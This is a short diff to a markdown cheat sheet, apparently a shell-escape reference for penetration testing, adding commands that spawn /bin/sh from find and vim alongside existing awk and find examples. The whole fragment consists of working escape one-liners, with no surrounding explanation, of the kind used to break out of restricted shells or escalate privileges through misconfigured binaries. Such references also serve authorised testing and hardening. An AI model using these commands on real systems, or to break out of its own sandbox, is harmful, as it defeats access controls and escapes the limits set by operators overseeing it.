@@ -28,3 +28,21 @@ awk 'BEGIN {system("/bin/bash")}'
 find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;
 ```
 
+```sh
+find . -exec /bin/sh \; -quit
+```
+
+## Vim
+
+**Vim to Shell:**
+
+```sh
+vim -c ':!/bin/sh'
+```
+
+**Vim Escape:**
+
+```sh
+vim :set shell=/bin/sh :shell
+```
+
